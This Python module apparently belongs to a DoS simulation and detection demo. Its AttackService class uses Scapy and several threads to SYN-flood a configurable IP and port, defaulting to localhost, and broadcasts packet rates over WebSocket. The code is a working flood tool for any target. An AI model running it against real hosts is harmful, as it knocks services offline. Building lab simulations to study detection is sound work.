import threading
import time
import random
from scapy.all import IP, TCP, send, conf

# Disable Scapy verbosity
conf.verb = 0


class AttackService:
    """Service for managing DoS attack simulation"""
    
    def __init__(self, socketio, detection_service=None):
        self.socketio = socketio
        self.detection_service = detection_service
        self.active = False
        self.packet_count = 0
        self.threads = []
        self.monitor_thread = None
        
    def start_syn_flood(self, target_ip='127.0.0.1', target_port=80, num_threads=8):
        """Start SYN flood attack"""
        if self.active:
            return {'success': False, 'message': 'Attack already running'}
        
        self.active = True
        self.packet_count = 0
        self.threads = []
        
        print(f"[AttackService] Starting SYN flood: {target_ip}:{target_port} with {num_threads} threads")
        
        # Start flood threads
        for i in range(num_threads):
            t = threading.Thread(
                target=self._flood_worker,
                args=(target_ip, target_port),
                name=f"FloodThread-{i}"
            )
            t.daemon = True
            t.start()
            self.threads.append(t)
        
        # Start monitoring thread
        self.monitor_thread = threading.Thread(target=self._broadcast_stats)
        self.monitor_thread.daemon = True
        self.monitor_thread.start()
        
        return {'success': True, 'message': f'Attack started with {num_threads} threads'}
    
    def _flood_worker(self, target_ip, target_port):
        """Individual flood worker thread"""
        while self.active:
            try:
                # Create SYN packet
                pkt = IP(dst=target_ip) / TCP(
                    sport=random.randint(1024, 65535),
                    dport=target_port,
                    flags="S"  # SYN flag
                )
                
                # Send packet
                send(pkt, verbose=False)
                self.packet_count += 1
                
                # Record packet in detection service
                if self.detection_service:
                    self.detection_service.record_packet({
                        'timestamp': time.time(),
                        'src': target_ip,
                        'dst': target_ip,
                        'sport': random.randint(1024, 65535),
                        'dport': target_port,
                        'flags': 'S'
                    })
                
            except Exception as e:
                print(f"[AttackService] Error in flood worker: {e}")
                time.sleep(0.1)
    
    def _broadcast_stats(self):
        """Broadcast attack statistics via WebSocket"""
        last_count = 0
        start_time = time.time()
        
        while self.active:
            try:
                current_count = self.packet_count
                rate = current_count - last_count  # Packets in last second
                elapsed = time.time() - start_time
                
                # Emit stats to all connected clients
                self.socketio.emit('attack_stats', {
                    'total': current_count,
                    'rate': rate,
                    'elapsed': round(elapsed, 1),
                    'status': 'attacking'
                })
                
                last_count = current_count
                time.sleep(1)
                
            except Exception as e:
                print(f"[AttackService] Error broadcasting stats: {e}")
    
    def stop(self):
        """Stop the attack"""
        if not self.active:
            return {'success': False, 'message': 'No active attack'}
        
        print("[AttackService] Stopping attack...")
        self.active = False
        
        # Wait for threads to finish (with timeout)
        for t in self.threads:
            t.join(timeout=2)
        
        if self.monitor_thread:
            self.monitor_thread.join(timeout=2)
        
        final_count = self.packet_count
        
        # Emit final stats
        self.socketio.emit('attack_stats', {
            'total': final_count,
            'rate': 0,
            'status': 'stopped'
        })
        
        print(f"[AttackService] Attack stopped. Total packets: {final_count}")
        
        return {'success': True, 'message': f'Attack stopped. Total packets: {final_count}'}
    
    def get_status(self):
        """Get current attack status"""
        return {
            'active': self.active,
            'packet_count': self.packet_count,
            'thread_count': len([t for t in self.threads if t.is_alive()])
        }
